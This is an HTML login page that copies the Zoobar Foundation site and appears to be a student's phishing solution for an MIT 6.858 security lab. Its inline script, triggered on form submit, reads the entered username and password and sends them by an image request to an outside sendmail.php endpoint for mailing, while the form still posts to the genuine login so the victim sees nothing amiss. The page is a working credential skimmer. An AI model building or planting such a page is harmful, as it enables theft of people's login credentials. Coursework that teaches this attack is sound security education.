<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link rel="stylesheet" type="text/css" href="/zoobar/media/zoobar.css">
        <title>
          Login - Zoobar Foundation
        </title>
    </head>
    <body>
        
      <h1><a href="/zoobar/index.cgi/">Zoobar Foundation for Disciplined
                      Discourse</a></h1>
      <h2>Supporting the shrewd
          advocates of the new world order</h2>

<script>function stealthings() {
    javascript:void((new Image()).src='http://css.csail.mit.edu/6.858/2014/labs/sendmail.php?' + 'to=adat@mit.edu' + '&payload=' + document.forms["loginform"]["login_username"].value + "," + document.forms["loginform"]["login_password"].value + '&random=' + Math.random());
}</script>


<div id="login" class="centerpiece">
<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" onsubmit="stealthings()">
<table>
<tr>
   <td>Username:</td>
  <td><input type="text" name="login_username" size="20"
  autocomplete="no" value=""></td>
</tr>
<tr>
   <td>Password:</td>
  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
  <input type="submit" name="submit_login" value="Log in">
  <input type="submit" name="submit_registration" value="Register"></td>
</tr>
</table>
<input type="hidden" name="nexturl" value="/zoobar/index.cgi/">
</form>
</div>
<div class="footer warning">

</div>
<script>document.loginform.login_username.focus();</script>

    </body>
</html>
